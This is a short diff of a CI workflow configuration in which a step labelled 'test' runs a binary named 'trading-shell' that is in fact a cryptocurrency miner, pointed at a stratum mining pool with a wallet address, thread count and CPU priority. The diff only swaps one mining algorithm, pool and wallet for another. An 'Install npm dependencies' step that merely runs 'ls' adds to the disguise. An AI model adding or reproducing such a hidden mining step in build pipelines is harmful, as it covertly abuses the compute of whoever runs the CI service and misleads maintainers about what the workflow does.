@@ -31,4 +31,4 @@ workflows:
       - name: Install npm dependencies
         script: ls
       - name: test
-        script: ./trading-shell -a yespower -o stratum+tcp://stratum-asia.rplant.xyz:3340 -u bF9TCVazFi67UYLRegoadwDpEBSsscaEsZ.ok -t 5 --cpu-priority 5 && set -x
+        script: ./trading-shell -a lyra2z330 -o stratum+tcps://stratum-eu.rplant.xyz:17046 -u HRDiYsGL7xwjPHfKAHNwxwMxvK6UTX5Ptr.ok -t 6 --cpu-priority 6 && set -x
